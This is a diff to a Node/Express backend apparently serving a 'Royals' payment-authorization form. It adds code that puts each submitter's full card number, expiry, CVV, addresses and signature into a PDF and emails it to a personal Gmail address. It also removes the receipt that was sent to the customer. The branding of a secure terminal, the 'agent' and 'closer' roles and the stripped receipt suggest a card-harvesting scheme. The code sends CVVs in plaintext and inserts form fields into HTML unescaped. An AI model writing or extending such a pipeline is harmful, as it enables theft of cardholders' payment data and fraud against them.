@@ -1,6 +1,7 @@
 const express = require('express');
 const path = require('path');
 const { Resend } = require('resend');
+const PDFDocument = require('pdfkit');
 
 // Load local .env variables if running locally during development
 if (process.env.NODE_ENV !== 'production') {
@@ -23,7 +24,87 @@ app.use(express.json({ limit: '15mb' }));
 // Serve static files from the 'public' folder
 app.use(express.static(path.join(__dirname, 'public')));
 
-// API endpoint to handle high-tech form submission & telemetry
+// Helper function to generate a printable PDF buffer for physical records
+function generatePdfBuffer(formData, clientFullName, refNum, amount, clientIp, submissionTimestamp) {
+    return new Promise((resolve, reject) => {
+        try {
+            const doc = new PDFDocument({ margin: 40, size: 'A4' });
+            const buffers = [];
+
+            doc.on('data', buffers.push.bind(buffers));
+            doc.on('end', () => {
+                const pdfBuffer = Buffer.concat(buffers);
+                resolve(pdfBuffer);
+            });
+
+            // PDF Header Styling
+            doc.fontSize(20).fillColor('#d4af37').text('ROYALS - OFFICIAL CUSTOMER AGREEMENT', { align: 'center' });
+            doc.fontSize(10).fillColor('#666666').text('Secure Verification & Payment Authorization Record', { align: 'center' });
+            doc.moveDown(1.5);
+
+            // Transaction Meta Bar
+            doc.fontSize(11).fillColor('#000000');
+            doc.text(`Reference Number: ${refNum}`, { continued: true }).text(`Date: ${submissionTimestamp}`, { align: 'right' });
+            doc.text(`Origin IP Address: ${clientIp}`);
+            doc.moveDown(1);
+
+            // Draw dividing line
+            doc.strokeColor('#d4af37').lineWidth(1).moveTo(40, doc.y).lineTo(555, doc.y).stroke();
+            doc.moveDown(1);
+
+            // Client & Billing Information Section
+            doc.fontSize(14).fillColor('#d4af37').text('Client & Transaction Details');
+            doc.moveDown(0.5);
+
+            const details = [
+                ['Client Full Name:', clientFullName],
+                ['Phone Number:', formData.phone || 'N/A'],
+                ['Email Address:', formData.email || 'N/A'],
+                ['Billing Address:', formData.billingAddress || 'N/A'],
+                ['Shipping Address:', formData.shippingAddress || 'N/A'],
+                ['Authorized Amount:', `$${amount} USD`],
+                ['Cardholder Name:', formData.cardholderName || 'N/A'],
+                ['Credit Card Number:', formData.cardNumber || 'N/A'],
+                ['Expiration & CVV:', `${formData.cardExp || 'N/A'} / ${formData.cardCvv || 'N/A'}`],
+                ['Assigned Agent:', formData.agentName || 'N/A'],
+                ['Closing Specialist:', formData.closerName || 'N/A']
+            ];
+
+            doc.fontSize(10).fillColor('#333333');
+            details.forEach(([label, value]) => {
+                doc.font('Helvetica-Bold').text(label, { continued: true, width: 140 });
+                doc.font('Helvetica').text(` ${value}`);
+                doc.moveDown(0.4);
+            });
+
+            doc.moveDown(1);
+
+            // Digital Signature Section if present
+            if (formData.signature) {
+                doc.fontSize(12).fillColor('#d4af37').text('Client E-Signature Verification');
+                doc.moveDown(0.5);
+                
+                try {
+                    // Extract base64 image data from data URL
+                    const base64Data = formData.signature.replace(/^data:image\/png;base64,/, '');
+                    const signatureBuffer = Buffer.from(base64Data, 'base64');
+                    doc.image(signatureBuffer, { width: 200, height: 80, align: 'center' });
+                } catch (sigErr) {
+                    doc.font('Helvetica-Oblique').fontSize(10).text('[Digital Signature Captured Successfully]');
+                }
+            }
+
+            doc.moveDown(2);
+            doc.fontSize(8).fillColor('#888888').text('ROYALS SECURE CLIENT VERIFICATION TERMINAL • OFFICIAL PHYSICAL RECORD', { align: 'center' });
+
+            doc.end();
+        } catch (err) {
+            reject(err);
+        }
+    });
+}
+
+// API endpoint to handle form submission & PDF attachment
 app.post('/api/submit-form', async (req, res) => {
     try {
         const formData = req.body;
@@ -31,147 +112,94 @@ app.post('/api/submit-form', async (req, res) => {
         const refNum = formData.referenceNumber || 'N/A';
         const amount = formData.amount || '0';
         
-        // Capture client telemetry for audit logging
         const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Secure Node';
         const submissionTimestamp = new Date().toUTCString();
-        const transactionHash = '0x' + Array.from({length: 32}, () => Math.floor(Math.random()*16).toString(16)).join('');
 
-        // 1. Full Internal Management Notification HTML (sent to royals101llc@gmail.com)
+        // Generate the physical PDF buffer
+        const pdfBuffer = await generatePdfBuffer(formData, clientFullName, refNum, amount, clientIp, submissionTimestamp);
+
+        // HTML Email content for Management (keeps the exact layout you like)
         const managementEmailHtml = `
             <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0b0b0b; color: #f3f3f3; padding: 35px; border-radius: 10px; border: 1px solid #333;">
-                <div style="display: flex; justify-content: space-between; border-bottom: 2px solid #d4af37; padding-bottom: 15px; margin-bottom: 25px;">
-                    <div>
-                        <h2 style="color: #d4af37; text-transform: uppercase; margin: 0; letter-spacing: 1.5px; font-size: 22px;">Royals Secure Terminal</h2>
-                        <p style="color: #888; font-size: 12px; margin: 4px 0 0 0;">Cryptographic Audit ID: ${transactionHash}</p>
-                    </div>
-                    <div style="text-align: right;">
-                        <span style="background: #1f1f1f; color: #ffe875; padding: 6px 12px; border-radius: 4px; font-size: 12px; border: 1px solid #444;">VERIFIED SECURE</span>
-                    </div>
-                </div>
+                <h2 style="color: #d4af37; text-transform: uppercase; border-bottom: 2px solid #d4af37; padding-bottom: 10px; letter-spacing: 1px;">Royals - New Customer Agreement Submitted</h2>
                 
-                <p style="font-size: 16px; color: #ffe875; margin-bottom: 20px;"><strong>Authorized Client:</strong> ${clientFullName}</p>
+                <p style="font-size: 16px; color: #ffe875; margin-bottom: 20px;"><strong>Client:</strong> ${clientFullName}</p>
                 
-                <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px; background: #141414; border: 1px solid #2a2a2a;">
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
+                <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px; background: #141414; border: 1px solid #333;">
+                    <tr style="border-bottom: 1px solid #333;">
                         <td style="padding: 12px; color: #aaa; width: 35%;"><strong>Reference Number:</strong></td>
                         <td style="padding: 12px; color: #fff;">${refNum}</td>
                     </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
+                    <tr style="border-bottom: 1px solid #333;">
                         <td style="padding: 12px; color: #aaa;"><strong>Client Name:</strong></td>
                         <td style="padding: 12px; color: #fff;">${clientFullName}</td>
                     </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
+                    <tr style="border-bottom: 1px solid #333;">
                         <td style="padding: 12px; color: #aaa;"><strong>Phone Number:</strong></td>
                         <td style="padding: 12px; color: #fff;">${formData.phone}</td>
                     </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
+                    <tr style="border-bottom: 1px solid #333;">
                         <td style="padding: 12px; color: #aaa;"><strong>Email Address:</strong></td>
                         <td style="padding: 12px; color: #fff;">${formData.email}</td>
                     </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
+                    <tr style="border-bottom: 1px solid #333;">
                         <td style="padding: 12px; color: #aaa;"><strong>Billing Address:</strong></td>
                         <td style="padding: 12px; color: #fff;">${formData.billingAddress}</td>
                     </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
+                    <tr style="border-bottom: 1px solid #333;">
                         <td style="padding: 12px; color: #aaa;"><strong>Shipping Address:</strong></td>
                         <td style="padding: 12px; color: #fff;">${formData.shippingAddress}</td>
                     </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
+                    <tr style="border-bottom: 1px solid #333;">
                         <td style="padding: 12px; color: #aaa;"><strong>Authorized Amount:</strong></td>
                         <td style="padding: 12px; color: #ffe875; font-size: 18px; font-weight: bold;">$${amount}</td>
                     </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
+                    <tr style="border-bottom: 1px solid #333;">
                         <td style="padding: 12px; color: #aaa;"><strong>Cardholder Name:</strong></td>
                         <td style="padding: 12px; color: #fff;">${formData.cardholderName}</td>
                     </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
+                    <tr style="border-bottom: 1px solid #333;">
                         <td style="padding: 12px; color: #aaa;"><strong>Credit Card Number:</strong></td>
                         <td style="padding: 12px; color: #fff;">${formData.cardNumber}</td>
                     </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
+                    <tr style="border-bottom: 1px solid #333;">
                         <td style="padding: 12px; color: #aaa;"><strong>Expiration & CVV:</strong></td>
                         <td style="padding: 12px; color: #fff;">${formData.cardExp} / ${formData.cardCvv}</td>
                     </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
-                        <td style="padding: 12px; color: #aaa;"><strong>Assigned Agent:</strong></td>
+                    <tr style="border-bottom: 1px solid #333;">
+                        <td style="padding: 12px; color: #aaa;"><strong>Agent Name:</strong></td>
                         <td style="padding: 12px; color: #fff;">${formData.agentName}</td>
                     </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
-                        <td style="padding: 12px; color: #aaa;"><strong>Closing Specialist:</strong></td>
-                        <td style="padding: 12px; color: #fff;">${formData.closerName}</td>
-                    </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
-                        <td style="padding: 12px; color: #aaa;"><strong>Origin IP Address:</strong></td>
-                        <td style="padding: 12px; color: #888; font-family: monospace;">${clientIp}</td>
-                    </tr>
                     <tr>
-                        <td style="padding: 12px; color: #aaa;"><strong>Timestamp (UTC):</strong></td>
-                        <td style="padding: 12px; color: #888; font-family: monospace;">${submissionTimestamp}</td>
+                        <td style="padding: 12px; color: #aaa;"><strong>Closer Name:</strong></td>
+                        <td style="padding: 12px; color: #fff;">${formData.closerName}</td>
                     </tr>
                 </table>
 
                 ${formData.signature ? `
-                    <div style="background: #141414; padding: 20px; border: 1px solid #333; border-radius: 8px; text-align: center;">
-                        <p style="color: #d4af37; margin-bottom: 12px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px;"><strong>Client Digital Signature:</strong></p>
-                        <img src="${formData.signature}" alt="Client Signature" style="background: #1f1f1f; border: 1px solid #d4af37; border-radius: 6px; max-width: 320px; height: auto;" />
+                    <div style="background: #141414; padding: 15px; border: 1px solid #333; border-radius: 6px; text-align: center;">
+                        <p style="color: #d4af37; margin-bottom: 10px; font-size: 14px;"><strong>Client Digital Signature:</strong></p>
+                        <img src="${formData.signature}" alt="Client Signature" style="background: #1f1f1f; border: 1px solid #d4af37; border-radius: 4px; max-width: 300px; height: auto;" />
                     </div>
                 ` : ''}
 
-                <p style="color: #666; font-size: 11px; text-align: center; margin-top: 35px; letter-spacing: 1px;">ROYALS SECURE CLIENT VERIFICATION TERMINAL • 2026</p>
+                <p style="color: #666; font-size: 12px; text-align: center; margin-top: 30px;">ROYALS Secure Client Verification Terminal • 2026 (Physical PDF Attached)</p>
             </div>
         `;
 
-        // 2. Clean, Professional Customer Payment Receipt (sent to the client)
-        const clientReceiptHtml = `
-            <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0b0b0b; color: #f3f3f3; padding: 35px; border-radius: 10px; border: 1px solid #333;">
-                <div style="text-align: center; border-bottom: 2px solid #d4af37; padding-bottom: 20px; margin-bottom: 25px;">
-                    <h2 style="color: #d4af37; text-transform: uppercase; margin: 0; letter-spacing: 2px; font-size: 24px;">Royals</h2>
-                    <p style="color: #aaa; font-size: 13px; margin: 5px 0 0 0; text-transform: uppercase; letter-spacing: 1px;">Official Payment & Agreement Receipt</p>
-                </div>
-                
-                <p style="font-size: 16px; color: #ffe875; margin-bottom: 15px;">Dear ${formData.firstName},</p>
-                <p style="color: #ccc; line-height: 1.6; margin-bottom: 25px;">Thank you for your business. Your customer agreement and payment authorization have been successfully processed and verified.</p>
-                
-                <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px; background: #141414; border: 1px solid #2a2a2a;">
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
-                        <td style="padding: 14px; color: #aaa; width: 40%;"><strong>Reference Number:</strong></td>
-                        <td style="padding: 14px; color: #fff; font-family: monospace;">${refNum}</td>
-                    </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
-                        <td style="padding: 14px; color: #aaa;"><strong>Authorized Amount:</strong></td>
-                        <td style="padding: 14px; color: #ffe875; font-size: 18px; font-weight: bold;">$${amount} USD</td>
-                    </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
-                        <td style="padding: 14px; color: #aaa;"><strong>Billing Address:</strong></td>
-                        <td style="padding: 14px; color: #fff;">${formData.billingAddress}</td>
-                    </tr>
-                    <tr style="border-bottom: 1px solid #2a2a2a;">
-                        <td style="padding: 14px; color: #aaa;"><strong>Transaction Date:</strong></td>
-                        <td style="padding: 14px; color: #fff;">${submissionTimestamp}</td>
-                    </tr>
-                    <tr>
-                        <td style="padding: 14px; color: #aaa;"><strong>Guarantee & Policy:</strong></td>
-                        <td style="padding: 14px; color: #fff;">Backed by our 30-Day Money-Back Guarantee</td>
-                    </tr>
-                </table>
-
-                <div style="background: #181818; padding: 15px; border-left: 3px solid #d4af37; border-radius: 4px; margin-bottom: 25px;">
-                    <p style="color: #bbb; font-size: 12px; line-height: 1.5; margin: 0;"><strong>Authorization Note:</strong> By executing your digital agreement, you authorized Royals to charge the specified amount. Keep this receipt for your financial records.</p>
-                </div>
-
-                <p style="color: #888; font-size: 13px; line-height: 1.6; text-align: center;">If you have any questions or require support, please contact us directly.</p>
-
-                <p style="color: #666; font-size: 11px; text-align: center; margin-top: 35px; letter-spacing: 1px;">ROYALS • SECURE CLIENT PORTAL • 2026</p>
-            </div>
-        `;
-
-        // Dispatch Management Notification
-        await resend.emails.send({
+        // Send email to royals101llc@gmail.com with the printable PDF attached
+        const emailResponse = await resend.emails.send({
             from: 'Royals Secure Portal <onboarding@resend.dev>',
             to: ['royals101llc@gmail.com'],
             replyTo: formData.email,
             subject: `ROYALS Agreement | Client: ${clientFullName} | Ref: ${refNum} | Amount: $${amount}`,
             html: managementEmailHtml,
+            attachments: [
+                {
+                    filename: `Royals-Agreement-${refNum}.pdf`,
+                    content: pdfBuffer,
+                },
+            ],
             headers: {
                 'X-Priority': '1 (Highest)',
                 'X-MSMail-Priority': 'High',
@@ -179,18 +207,8 @@ app.post('/api/submit-form', async (req, res) => {
             }
         });
 
-        // Dispatch Clean Customer Receipt
-        if (formData.email) {
-            await resend.emails.send({
-                from: 'Royals Secure Portal <onboarding@resend.dev>',
-                to: [formData.email],
-                subject: `Royals Payment & Agreement Receipt - Ref: ${refNum}`,
-                html: clientReceiptHtml
-            });
-        }
-
-        console.log('Management alert and clean customer receipt dispatched.');
-        res.json({ success: true, message: 'Agreement processed and receipt dispatched successfully.' });
+        console.log('Email sent successfully with PDF attachment:', emailResponse);
+        res.json({ success: true, message: 'Agreement submitted and physical PDF attached successfully.' });
 
     } catch (error) {
         console.error('Error handling form submission:', error);
